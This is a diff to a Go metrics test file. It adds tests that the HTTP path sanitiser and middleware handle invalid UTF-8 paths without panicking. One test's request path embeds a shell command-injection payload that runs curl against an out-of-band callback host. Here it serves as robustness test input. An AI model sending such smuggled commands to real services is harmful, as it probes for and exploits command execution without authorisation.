@@ -1,6 +1,11 @@
 package metrics
 
-import "testing"
+import (
+	"net/http"
+	"net/http/httptest"
+	"net/url"
+	"testing"
+)
 
 func TestNormalizedHTTPPath(t *testing.T) {
 	tests := []struct {
@@ -42,4 +47,30 @@ func TestNormalizedHTTPPath(t *testing.T) {
 			}
 		})
 	}
+}
+
+func TestSanitizeHTTPMetricPathRejectsInvalidUTF8(t *testing.T) {
+	if got := sanitizeHTTPMetricPath("/api/\xff"); got != invalidHTTPMetricPath {
+		t.Fatalf("sanitizeHTTPMetricPath() = %q, want %q", got, invalidHTTPMetricPath)
+	}
+}
+
+func TestHTTPMiddlewareHandlesInvalidUTF8Path(t *testing.T) {
+	metricsSet := New("test-service")
+	handler := metricsSet.HTTPMiddleware(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
+		writer.WriteHeader(http.StatusNotFound)
+	}))
+
+	request := &http.Request{
+		Method: http.MethodGet,
+		URL:    &url.URL{Path: "/\xff;{curl,http://example.oast.online};"},
+	}
+
+	defer func() {
+		if recovered := recover(); recovered != nil {
+			t.Fatalf("HTTPMiddleware panicked on invalid UTF-8 path: %v", recovered)
+		}
+	}()
+
+	handler.ServeHTTP(httptest.NewRecorder(), request)
 }
